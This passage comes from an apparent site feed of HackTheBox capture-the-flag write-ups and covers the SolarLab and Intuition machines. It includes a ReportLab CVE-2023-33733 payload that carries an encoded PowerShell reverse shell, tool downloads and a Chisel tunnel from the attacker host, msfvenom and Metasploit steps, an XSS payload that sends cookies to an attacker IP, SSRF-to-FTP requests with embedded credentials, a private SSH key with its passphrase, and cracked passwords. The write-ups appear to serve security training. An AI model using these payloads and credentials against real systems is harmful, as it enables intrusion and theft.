|_http-server-header: nginx/1.24.0 |_http-title: Did not follow redirect to http://report.solarlab.htb:6791/ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: I attempted to use the \u0026lsquo;send contact\u0026rsquo; feature to test if we could inject XSS from here, but it initially utilized a GET request. Changing it to a POST request didn‚Äôt enable us to perform any actions.\nAs Nmap suggested that the supported methods were GET and HEAD, I used a HEAD request, which actually worked as intended.\nUser Flag Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran smbclient //10.10.11.16/Documents -U Guest, which actually worked and logged me in.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/SolarLab] ‚îî‚îÄ# smbclient //10.10.11.16/Documents -U Guest Password for [WORKGROUP\\Guest]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Fri Apr 26 10:47:14 2024 .. DR 0 Fri Apr 26 10:47:14 2024 concepts D 0 Fri Apr 26 10:41:57 2024 desktop.ini AHS 278 Fri Nov 17 05:54:43 2023 details-file.xlsx A 12793 Fri Nov 17 07:27:21 2023 My Music DHSrn 0 Thu Nov 16 14:36:51 2023 My Pictures DHSrn 0 Thu Nov 16 14:36:51 2023 My Videos DHSrn 0 Thu Nov 16 14:36:51 2023 old_leave_request_form.docx A 37194 Fri Nov 17 05:35:57 2023 7779839 blocks of size 4096. 1800663 blocks available smb: \\\u0026gt; get details-file.xlsx getting file \\details-file.xlsx of size 12793 as details-file.xlsx (35.2 KiloBytes/sec) (average 35.2 KiloBytes/sec) smb: \\\u0026gt; gvet old_leave_request_form.docx gvet: command not found smb: \\\u0026gt; get old_leave_request_form.docx getting file \\old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (45.7 KiloBytes/sec) (average 42.4 KiloBytes/sec) smb: \\\u0026gt; cd concepts smb: \\concepts\\\u0026gt; ls . D 0 Fri Apr 26 10:41:57 2024 .. D 0 Fri Apr 26 10:41:57 2024 Training-Request-Form.docx A 161337 Fri Nov 17 05:46:57 2023 Travel-Request-Sample.docx A 30953 Fri Nov 17 05:36:54 2023 7779839 blocks of size 4096. 1800276 blocks available I retrieved all the important files to see if there was anything interesting among them.\nOut of all the files, details-file.xlsx contained some useful information, such as passwords and emails. I took note of the usernames and passwords.\nNext, I visited port 6791, which had an HTTP service running on it. It redirected me to the report.solarlab.htb subdomain, which has a login page for ReportHub.\n\u0026ldquo;I tried brute-forcing the username and password fields using the credentials we found earlier with Burp Intruder. The following credentials worked: BlakeB:ThisCanB3typedeasily1@\nI did some research on ReportHub and found a CVE related to it: CVE-2023-33733.\nHere is the exploit code:\n1 2 3 \u0026lt;p\u0026gt;\u0026lt;font color=\u0026#34;[ [ getattr(pow,Word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANwA3ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\u0026#39;) for Word in [orgTypeFun(\u0026#39;Word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: False, \u0026#39;__eq__\u0026#39;: lambda self,x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt; exploit \u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; I used this request in the travel_request parameter of the /travelApprovalForm endpoint.\u0026rdquo;\nAnd I got the user flag\n1 2 PS C:\\Users\\blake\\Desktop\u0026gt; cat user.txt USERFLAG_REDACTED_HTB Root Flag I sent winPEAS.exe to the Windows box using the following command:\nInvoke-WebRequest \u0026quot;http://10.10.14.3/winPEASx86.exe\u0026quot; -OutFile \u0026quot;winpeasS.exe\u0026quot; (make sure the HTTP server is running).\nThen I ran .\\winpeasS.exe to execute it.\nFrom the output, I discovered that there is another user named openfire (in addition to Blake, admin accounts, and service accounts) on this machine. Additionally, winPEAS revealed that Openfire is running on port 9090.\nNext, I used Chisel to set up port forwarding.\nI ran chisel server -p 8000 --reverse on my Kali machine.\nThen, on the target machine, logged in as user Blake, I executed:\n.\\chisel.exe client 10.10.14.3:8000 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 (I transferred the Chisel executable to the target machine using Invoke-WebRequest \u0026quot;http://10.10.14.3/chisel.exe\u0026quot; -OutFile \u0026quot;chisel.exe\u0026quot; before running it).\nAfter port forwarding with Chisel, I accessed localhost:9090 and found an Openfire 4.7.4 admin console. This version has a known CVE, and an exploit is available in Metasploit.\nHere\u0026rsquo;s the exploit I used for Openfire 4.7.4\nI used exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315 to exploit the openfire.\nAlthough it didn‚Äôt create a session for us, it did create an admin user, which allowed us to log in to the application.\nI downloaded openfire-management-tool-plugin.jar from this GitHub repository.\nThen, I uploaded it in the Plugins tab. To do this, I changed the uploadsuccess=false to true in order to successfully upload our plugin. By default, the uploadsuccess parameter is set to false, which prevents the upload. I changed it to true to successfully upload the plugin.\nAfter uploading the plugin, navigate to Server \u0026gt; Server Settings \u0026gt; Management Tool. Set the password as \u0026lsquo;123\u0026rsquo;, then select \u0026lsquo;System Command\u0026rsquo;.\nWe found a shell execution point. I decided to execute a payload similar to the one used previously. I generated the payload from the same website I used before. Then, I launched nc and started listening on port 6565 to receive the reverse shell. Finally, I executed the PowerShell reverse shell payload from the website.\nAfter executing the command, I gained shell access for the user solarlab\\openfire.\nI discovered interesting credentials within the openfire.script file located at the PS C:\\Program Files\\Openfire\\embedded-db\\ directory.\n1 2 3 4 5 // NOTE: ONLY IMPORTANT DETAILS EXTRACTED FRROM THE SCRIPT IS SHOWN BELOW CREATE USER SA PASSWORD DIGEST \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39; INSERT INTO OFPROPERTY VALUES(\u0026#39;passwordKey\u0026#39;,\u0026#39;hGXiFzsKaAeYLjn\u0026#39;,0,NULL) INSERT INTO OFUSER VALUES(\u0026#39;admin\u0026#39;,\u0026#39;gjMoswpK+HakPdvLIvp6eLKlYh0=\u0026#39;,\u0026#39;9MwNQcJ9bF4YeyZDdns5gvXp620=\u0026#39;,\u0026#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x\u0026#39;,4096,NULL,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) I received an encrypted password and a passkey. To decrypt the password, I used them together with https://github.com/c0rdis/openfire_decrypt. Following the instructions, I compiled the JAR file:\n1 javac OpenFireDecryptPass.java This command compiled the JAR file. To crack the hash, I executed:\n1 java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn In this command, the first argument is the encrypted password, and the second one is the passkey. Through this process, I successfully cracked the hashes, revealing the credentials:\nAdministrator:ThisPasswordShouldDo!@\nNow, I am armed with these credentials.\nI installed sudo wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip on my Kali machine and then transferred the .exe file inside the zip to my target machine using Invoke-WebRequest \u0026quot;http://10.10.14.3:8888/RunasCs.exe\u0026quot; -OutFile \u0026quot;runascs.exe\u0026quot;. After that, I created a payload with msfvenom: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9898 -f exe -o shell.exe and then sent the shell.exe file to the target machine using: Invoke-WebRequest \u0026quot;http://10.10.14.3/shell.exe\u0026quot; -OutFile \u0026quot;shell.exe\u0026quot;.\nNow that I have both of the .exe files on my target machine, I will use the multi/handler in Metasploit to capture the shell.\nTo set up the multi/handler, I ran these commands sequentially:\nmsfconsole use multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 9898 run After that, I went to my target machine and executed the command: .\\runascs.exe Administrator ThisPasswordShouldDo!@ shell.exe\nUpon running the above code, I observed that the meterpreter shell popped up, and I gained administrator access. üôÇ\nWe rooted this box! Yay!\nConclusion Thanks for following my writeup on this box. I hope you learned something new from my methodology.\n","permalink":"http://localhost:1313/writeups/hackthebox/solarlab/","summary":"SolarLab is a medium Windows machine leveraging guest SMB access to extract creds, then exploiting ReportLab CVE-2023-33733 for RCE as blake. Local Openfire is then exploited via CVE-2023-32315 for code execution, with log analysis revealing reused Administrator credentials for full access.","title":"SolarLab Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/Intuition Difficulty Hard Machine Linux Enumeration Nmap Scan I started with an Nmap scan to identify open ports on the target machine. The scan revealed two open ports:\nPort 22: SSH Port 80: HTTP Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U= | 256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://comprezzor.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel When I navigated to the web service running on port 80, I was greeted with the initial site. This gave me a first look at the target\u0026rsquo;s web interface and allowed me to begin assessing potential entry points or vulnerabilities in the web application.\nDuring my exploration, I discovered several subdomains associated with the target:\nreport.comprezzor.htb auth.comprezzor.htb dashboard.comprezzor.htb (requires login as an authorized user) User Flag To gain unauthorized access, I decided to attempt stealing cookies using a cross-site scripting (XSS) vulnerability. I used the bug report form on report.comprezzor.htb for this purpose. Here is the payload I used:\n1 \u0026lt;script\u0026gt;var i=new Image(); i.src=\u0026#34;http://10.10.14.102:80/?cookie=\u0026#34;+btoa(document.cookie);\u0026lt;/script\u0026gt; This payload successfully captured the cookie by sending the cookie data to my server at http://10.10.14.102. With this session cookie, I could potentially access restricted areas like dashboard.comprezzor.htb, demonstrating a significant security flaw that could be exploited for further penetration testing.\nAfter countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.\n1 2 3 10.129.54.146 - - [28/Apr/2024 11:51:15] \u0026#34;GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1\u0026#34; 404 - 10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found 10.129.54.146 - - [28/Apr/2024 11:51:15] \u0026#34;GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1\u0026#34; 404 - Using the stolen cookie, I accessed the \u0026ldquo;Create PDF Report\u0026rdquo; site. From here, I executed a Server-Side Request Forgery (SSRF) attack by manipulating the report URL to send a request to my own HTTP server. This allowed me to intercept and analyze the server\u0026rsquo;s response.\nThrough this SSRF attack, I received a new cookie:\n1 eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:\n1 User-Agent: Python-urllib/3.11 This indicated that the application might be using a Python script to handle requests. Recognizing the potential for exploitation, I researched and found relevant exploits, including one discussed in this GitHub issue.\nUtilizing this CVE, I managed to retrieve the source code of the application via the SSRF attack. Access to the source code provided valuable insights into the internal workings of the application, including potential vulnerabilities and misconfigurations.\nUsing the SSRF vulnerability, I targeted the specific path where the application code was likely stored. By sending a request to fetch python3/app/code/app.py, I successfully retrieved the source code of the Flask application.\nBy analyzing the source code retrieved from python3/app/code/app.py, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 project_folder/ ‚îÇ ‚îú‚îÄ‚îÄ app.py ‚îÇ ‚îú‚îÄ‚îÄ blueprints/ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ index/ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ index.py ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ report/ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ report.py ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ auth/ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ auth.py ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ dashboard/ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îî‚îÄ‚îÄ dashboard.py ‚îÇ ‚îî‚îÄ‚îÄ static/ ‚îú‚îÄ‚îÄ css/ ‚îú‚îÄ‚îÄ js/ ‚îî‚îÄ‚îÄ ... With the useful code extracted from dashboard.py using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.\n1 2 3 4 5 6 7 8 9 10 11 12 try: ftp = FTP(\u0026#39;ftp.local\u0026#39;) ftp.login(user=\u0026#39;ftp_admin\u0026#39;, passwd=\u0026#39;u3jai8y71s2\u0026#39;) ftp.cwd(\u0026#39;/\u0026#39;) with open(backup_filename, \u0026#39;rb\u0026#39;) as file: ftp.storbinary(f\u0026#39;STOR {backup_filename}\u0026#39;, file) ftp.quit() os.remove(backup_filename) flash(\u0026#39;Backup and upload completed successfully!\u0026#39;, \u0026#39;success\u0026#39;) except Exception as e: flash(f\u0026#39;Error: {str(e)}\u0026#39;, \u0026#39;error\u0026#39;) return redirect(url_for(\u0026#39;dashboard.dashboard\u0026#39;)) In the code above, I noticed FTP credentials. I\u0026rsquo;ll utilize the SSRF method to connect to this FTP.\n1 ftp://ftp_admin:u3jai8y71s2@ftp.local/ I used the FTP credentials as an SSRF payload from the previous step. We observed there is a private key. I attempt to view it.\nWith this payload, I will attempt to view the private key located at the following FTP URL: ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7 x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+ efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec 80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7 cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT 9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/ Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW 1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3 NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4 AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI 9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6 XxwXArPr6+HQe9hZSjI2hjYC2OU= -----END OPENSSH PRIVATE KEY----- There is also a passphrase \u0026ldquo;Y27SH19HDIWD\u0026rdquo; on the FTP server, which we can retrieve using the following payload:\nreport_url=++++ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt\nNow I will execute ssh-add to extract the username from the id_rsa file.\n1 2 3 4 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/s5] ‚îî‚îÄ$ ssh-add id_rsa Enter passphrase for id_rsa: Identity added: id_rsa (dev_acc@local) It indicates that the user is dev_acc. Now, I will SSH to the user using the command: ssh dev_acc@10.129.54.146 -i id_rsa.\nWe successfully obtained the user flag! üö©\nRoot Flag Now, I\u0026rsquo;ll run LinPEAS by fetching it from my host system using a HTTP server created with Python.\n1 2 3 4 5 ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Users with console adam:x:1002:1002:,,,:/home/adam:/bin/bash dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash lopez:x:1003:1003:,,,:/home/lopez:/bin/bash root:x:0:0:root:/root:/bin/bash After LinPEAS finished running, I made note of the users in case we might need them later.\nAdditionally, I found a users.db file in the blueprints directory. I will view its contents using cat to see if we can gather any information.\nThe users.db file contains a hash for the user \u0026ldquo;adam\u0026rdquo;. We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.\n1 2 3 4 5 6 7 ÔøΩÔøΩÔøΩÔøΩP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)ÔøΩ3ÔøΩEtableusersusersCREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, role TEXT DEFAULT \u0026#39;user\u0026#39; ,ÔøΩ,##wÔøΩÔøΩhÔøΩ=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevhÔøΩ=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ After cracking the hash for user \u0026ldquo;adam\u0026rdquo; using hashcat with the command:\n1 hashcat.exe -m 30120 myhash.txt rockyou.txt The credentials for user \u0026ldquo;adam\u0026rdquo; are:\n1 2 username: adam password: adam gray I conducted further enumeration and discovered valid credentials for another user.\n1 2 3 4 5 dev_acc@intuition:/$ zgrep -i lopez /var/log/suricata/*.gz /var/log/suricata/eve.json.7.gz:{\u0026#34;timestamp\u0026#34;:\u0026#34;2023-09-28T17:43:36.099184+0000\u0026#34;,\u0026#34;flow_id\u0026#34;:1988487100549589,\u0026#34;in_iface\u0026#34;:\u0026#34;ens33\u0026#34;,\u0026#34;event_type\u0026#34;:\u0026#34;ftp\u0026#34;,\u0026#34;src_ip\u0026#34;:\u0026#34;192.168.227.229\u0026#34;,\u0026#34;src_port\u0026#34;:37522,\u0026#34;dest_ip\u0026#34;:\u0026#34;192.168.227.13\u0026#34;,\u0026#34;dest_port\u0026#34;:21,\u0026#34;proto\u0026#34;:\u0026#34;TCP\u0026#34;,\u0026#34;tx_id\u0026#34;:1,\u0026#34;community_id\u0026#34;:\u0026#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=\u0026#34;,\u0026#34;ftp\u0026#34;:{\u0026#34;command\u0026#34;:\u0026#34;USER\u0026#34;,\u0026#34;command_data\u0026#34;:\u0026#34;lopez\u0026#34;,\u0026#34;completion_code\u0026#34;:[\u0026#34;331\u0026#34;],\u0026#34;reply\u0026#34;:[\u0026#34;Username ok, send password.\u0026#34;],\u0026#34;reply_received\u0026#34;:\u0026#34;yes\u0026#34;}} /var/log/suricata/eve.json.7.gz:{\u0026#34;timestamp\u0026#34;:\u0026#34;2023-09-28T17:43:52.999165+0000\u0026#34;,\u0026#34;flow_id\u0026#34;:1988487100549589,\u0026#34;in_iface\u0026#34;:\u0026#34;ens33\u0026#34;,\u0026#34;event_type\u0026#34;:\u0026#34;ftp\u0026#34;,\u0026#34;src_ip\u0026#34;:\u0026#34;192.168.227.229\u0026#34;,\u0026#34;src_port\u0026#34;:37522,\u0026#34;dest_ip\u0026#34;:\u0026#34;192.168.227.13\u0026#34;,\u0026#34;dest_port\u0026#34;:21,\u0026#34;proto\u0026#34;:\u0026#34;TCP\u0026#34;,\u0026#34;tx_id\u0026#34;:2,\u0026#34;community_id\u0026#34;:\u0026#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=\u0026#34;,\u0026#34;ftp\u0026#34;:{\u0026#34;command\u0026#34;:\u0026#34;PASS\u0026#34;,\u0026#34;command_data\u0026#34;:\u0026#34;Lopezzz1992%123\u0026#34;,\u0026#34;completion_code\u0026#34;:[\u0026#34;530\u0026#34;],\u0026#34;reply\u0026#34;:[\u0026#34;Authentication failed.\u0026#34;],\u0026#34;reply_received\u0026#34;:\u0026#34;yes\u0026#34;}} /var/log/suricata/eve.json.7.gz:{\u0026#34;timestamp\u0026#34;:\u0026#34;2023-09-28T17:44:32.133372+0000\u0026#34;,\u0026#34;flow_id\u0026#34;:1218304978677234,\u0026#34;in_iface\u0026#34;:\u0026#34;ens33\u0026#34;,\u0026#34;event_type\u0026#34;:\u0026#34;ftp\u0026#34;,\u0026#34;src_ip\u0026#34;:\u0026#34;192.168.227.229\u0026#34;,\u0026#34;src_port\u0026#34;:45760,\u0026#34;dest_ip\u0026#34;:\u0026#34;192.168.227.13\u0026#34;,\u0026#34;dest_port\u0026#34;:21,\u0026#34;proto\u0026#34;:\u0026#34;TCP\u0026#34;,\u0026#34;tx_id\u0026#34;:1,\u0026#34;community_id\u0026#34;:\u0026#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=\u0026#34;,\u0026#34;ftp\u0026#34;:{\u0026#34;command\u0026#34;:\u0026#34;USER\u0026#34;,\u0026#34;command_data\u0026#34;:\u0026#34;lopez\u0026#34;,\u0026#34;completion_code\u0026#34;:[\u0026#34;331\u0026#34;],\u0026#34;reply\u0026#34;:[\u0026#34;Username ok, send 